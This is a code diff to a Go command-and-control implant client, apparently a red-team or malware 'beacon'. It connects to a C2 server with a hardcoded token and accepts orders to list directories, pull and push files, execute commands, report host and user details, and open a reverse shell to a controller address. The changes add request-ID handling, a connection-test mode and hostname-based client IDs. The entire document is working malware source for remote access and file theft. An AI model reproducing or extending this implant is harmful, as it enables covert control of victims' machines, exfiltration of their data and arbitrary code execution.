@@ -29,6 +29,7 @@ var (
 	DefaultServerPort = "9000"
 	DefaultAuthToken  = "supersecret"
 	DefaultClientID   = "default-hydrangea-beacon"
+	DefaultRootBase   = "."
 )
 
 type Header map[string]any
@@ -97,6 +98,23 @@ func readFrame(conn net.Conn) (Header, []byte, error) {
 	return hdr, payload, nil
 }
 
+// ---------- helpers ----------
+
+// firstString returns the first non-empty string among the provided keys.
+func firstString(m map[string]any, keys ...string) string {
+	for _, k := range keys {
+		if v, ok := m[k]; ok {
+			switch t := v.(type) {
+			case string:
+				if t != "" {
+					return t
+				}
+			}
+		}
+	}
+	return ""
+}
+
 // ---------- path helpers ----------
 
 func safeJoin(root string, p string) (string, error) {
@@ -121,8 +139,14 @@ func safeJoin(root string, p string) (string, error) {
 
 // ---------- order handlers ----------
 
-func handlePing(conn net.Conn) {
-	_ = writeFrame(conn, Header{"type": "PONG"}, nil)
+// PING: echo req_id if present so waiters can correlate.
+func handlePing(conn net.Conn, hdr Header) {
+	reqID, _ := hdr["req_id"].(string)
+	reply := Header{"type": "PONG"}
+	if reqID != "" {
+		reply["req_id"] = reqID
+	}
+	_ = writeFrame(conn, reply, nil)
 }
 
 func handleList(conn net.Conn, root string, hdr Header) {
@@ -149,7 +173,7 @@ func handleList(conn net.Conn, root string, hdr Header) {
 	ents := make([]entry, 0, len(dir))
 	for _, de := range dir {
 		info, err := de.Info()
-		if err != nil {
+			if err != nil {
 			continue
 		}
 		ents = append(ents, entry{
@@ -169,11 +193,12 @@ func handleList(conn net.Conn, root string, hdr Header) {
 	_ = writeFrame(conn, h, payload)
 }
 
+// PULL: accept src/src_path and keep save_as; respond with FILE payload (bytes).
 func handlePullFile(conn net.Conn, root string, hdr Header) {
-	src, _ := hdr["src"].(string)
-	saveAs, _ := hdr["save_as"].(string)
+	src := firstString(hdr, "src", "src_path")
+	saveAs := firstString(hdr, "save_as") // server may fallback if empty
 	if src == "" {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": "PULL_FILE missing src"}, nil)
+		_ = writeFrame(conn, Header{"type": "LOG", "message": "PULL_FILE missing src/src_path"}, nil)
 		return
 	}
 	full, err := safeJoin(root, src)
@@ -196,9 +221,12 @@ func handlePullFile(conn net.Conn, root string, hdr Header) {
 	_ = writeFrame(conn, h, data)
 }
 
+// PUSH: accept dest/dest_path and log a clear success message.
 func handlePushFile(conn net.Conn, root string, hdr Header, payload []byte) {
-	dest, _ := hdr["dest"].(string)
+	dest := firstString(hdr, "dest", "dest_path")
+	srcName := firstString(hdr, "src_name", "name")
 	if dest == "" {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": "PUSH_FILE missing dest/dest_path"}, nil)
 		return
 	}
 	full, err := safeJoin(root, dest)
@@ -214,7 +242,10 @@ func handlePushFile(conn net.Conn, root string, hdr Header, payload []byte) {
 		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE write: %v", err)}, nil)
 		return
 	}
-	_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE ok -> %s", full)}, nil)
+	_ = writeFrame(conn, Header{
+		"type":    "LOG",
+		"message": fmt.Sprintf("PUSH_FILE ok -> %s (%d bytes) from %s", full, len(payload), srcName),
+	}, nil)
 }
 
 func handleExec(conn net.Conn, root string, hdr Header) {
@@ -296,18 +327,20 @@ func handleExec(conn net.Conn, root string, hdr Header) {
 	_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(result))
 }
 
-func handleSession(conn net.Conn, root string, _ Header) {
+// SESSION: include req_id and a "python" key (for controller UI parity).
+func handleSession(conn net.Conn, root string, hdr Header) {
+	reqID, _ := hdr["req_id"].(string)
 	u, _ := user.Current()
 	host, _ := os.Hostname()
 	cwd, _ := os.Getwd()
 	info := map[string]any{
-		"platform":   runtime.GOOS + "-" + runtime.GOARCH,
+		"platform":   fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH),
 		"system":     runtime.GOOS,
-		"release":    runtime.Version(),
-		"version":    runtime.Version(),
+		"release":    "-",               // not easily portable
+		"version":    runtime.Version(), // Go runtime version
 		"machine":    runtime.GOARCH,
 		"processor":  runtime.GOARCH,
-		"runtime":    runtime.Version(),
+		"python":     "-",               // keep key for controller UI
 		"pid":        os.Getpid(),
 		"user":       func() string { if u != nil { return u.Username }; return "" }(),
 		"cwd":        cwd,
@@ -316,35 +349,34 @@ func handleSession(conn net.Conn, root string, _ Header) {
 		"executable": os.Args[0],
 	}
 	payload, _ := json.Marshal(info)
-	_ = writeFrame(conn, Header{"type": "RESULT_SESSION_INFO"}, payload)
+	h := Header{"type": "RESULT_SESSION_INFO"}
+	if reqID != "" {
+		h["req_id"] = reqID
+	}
+	_ = writeFrame(conn, h, payload)
 }
 
-// Reverse shell: start it in background, never block the C2 goroutine,
-// and never write to the C2 socket from the background goroutine.
+// Reverse shell: launched in background; never blocks C2 goroutine and
+// never writes to the C2 socket from its goroutine.
 func handleReverseShell(conn net.Conn, _root string, hdr Header) {
 	controllerAddr, _ := hdr["controller_addr"].(string)
 	if controllerAddr == "" {
 		_ = writeFrame(conn, Header{"type": "LOG", "message": "REVERSE_SHELL failed: controller address missing"}, nil)
 		return
 	}
-
-	// Log once and return immediately so main loop remains responsive.
 	_ = writeFrame(conn, Header{
 		"type":    "LOG",
 		"message": fmt.Sprintf("REVERSE_SHELL: launching background connector to %s", controllerAddr),
 	}, nil)
 
-	// Background goroutine. Do NOT touch the C2 socket here.
 	go func(addr string) {
 		rsock, err := net.Dial("tcp", addr)
 		if err != nil {
-			// Avoid writing LOG back on the C2 socket from here.
+			// avoid touching C2 socket here
 			return
 		}
 		defer rsock.Close()
-
-		// Delegate to OS-specific spawner (implemented in revshell_*.go via build tags).
-		_ = spawnReverseShell(rsock)
+		_ = spawnReverseShell(rsock) // implemented in revshell_*.go
 	}(controllerAddr)
 }
 
@@ -355,19 +387,43 @@ func main() {
 	port := flag.Int("port", func() int { p, _ := strconv.Atoi(DefaultServerPort); if p == 0 { p = 9000 }; return p }(), "Server port")
 	token := flag.String("auth-token", DefaultAuthToken, "Auth token")
 	clientID := flag.String("client-id", DefaultClientID, "Client ID (default: hostname)")
-	root := flag.String("root", "/", "Base directory for relative paths")
+	root := flag.String("root", DefaultRootBase, "Base directory for relative paths")
+	testConnection := flag.Bool("test-connection", false, "Test connection to server and exit")
 	flag.Parse()
 
 	id := *clientID
-	if id == "" {
-		if h, err := os.Hostname(); err == nil {
+	if id == "" || id == "default-hydrangea-beacon" {
+		if h, err := os.Hostname(); err == nil && h != "" {
 			id = h
 		} else {
-			id = "client"
+			id = fmt.Sprintf("default-hydrangea-beacon-%d", time.Now().UnixNano()%100000)
 		}
 	}
 
 	addr := fmt.Sprintf("%s:%d", *server, *port)
+	
+	// Test connection mode
+	if *testConnection {
+		id = fmt.Sprintf("test-connection-%d", time.Now().UnixNano()%100000)
+		fmt.Printf("Testing connection to %s with client ID '%s'...\n", addr, id)
+		conn, err := net.Dial("tcp", addr)
+		if err != nil {
+			fmt.Printf("Connection failed: %v\n", err)
+			os.Exit(1)
+		}
+		defer conn.Close()
+		
+		err = writeFrame(conn, Header{"type": "REGISTER", "client_id": id, "token": *token}, nil)
+		if err != nil {
+			fmt.Printf("Registration failed: %v\n", err)
+			os.Exit(1)
+		}
+		
+		fmt.Println("Connection test successful!")
+		os.Exit(0)
+	}
+
+	// Normal connection loop
 	for {
 		if err := runOnce(addr, id, *token, *root); err != nil {
 			time.Sleep(2 * time.Second)
@@ -396,7 +452,7 @@ func runOnce(addr, clientID, token, root string) error {
 		}
 		switch hdr["type"] {
 		case "PING":
-			handlePing(conn)
+			handlePing(conn, hdr)
 		case "LIST_DIR":
 			handleList(conn, root, hdr)
 		case "PULL_FILE":
@@ -410,7 +466,7 @@ func runOnce(addr, clientID, token, root string) error {
 		case "REVERSE_SHELL":
 			handleReverseShell(conn, root, hdr)
 		default:
-			// ignore unknown
+			// ignore unknown / future orders
 		}
 	}
 }
